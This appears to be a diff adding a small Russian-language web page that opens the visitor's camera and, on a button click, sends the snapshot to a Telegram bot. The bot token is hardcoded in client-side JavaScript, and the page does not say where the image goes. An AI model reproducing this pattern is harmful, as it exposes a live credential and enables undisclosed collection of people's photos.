@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Фото</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; }
+        #video, #canvas { border: 1px solid #ccc; margin: 20px; }
+        button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Сделайте фото</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="snap">Сделать снимок</button>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const snapButton = document.getElementById('snap');
+
+        // 1. Доступ к камере
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                alert("Ошибка доступа к камере: " + err.message);
+            });
+
+        // 2. Сделать снимок
+        snapButton.addEventListener('click', () => {
+            // Рисуем кадр на canvas
+            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+            
+            // Преобразуем canvas в Blob (изображение)
+            canvas.toBlob(blob => {
+                sendPhotoToBot(blob);
+            }, 'image/jpeg', 0.8); // JPEG с качеством 80%
+        });
+
+        // 3. Отправка фото во второй бот
+        async function sendPhotoToBot(blob) {
+            const formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', '8551479871'); // ID чата приёмного бота
+
+            try {
+                const response = await fetch(
+                    'https://api.telegram.org/bot8551479871:AAHS2opri-elohiHjfsTk5JGtIElAMpHWNs/sendPhoto',
+                    {
+                        method: 'POST',
+                        body: formData
+                    }
+                );
+                
+                const result = await response.json();
+                if (result.ok) {
+                    alert("Фото успешно отправлено!");
+                } else {
+                    alert("Ошибка отправки: " + result.description);
+                }
+            } catch (error) {
+                alert("Ошибка сети: " + error.message);
+            }
+        }
+    </script>
+</body>
+</html>
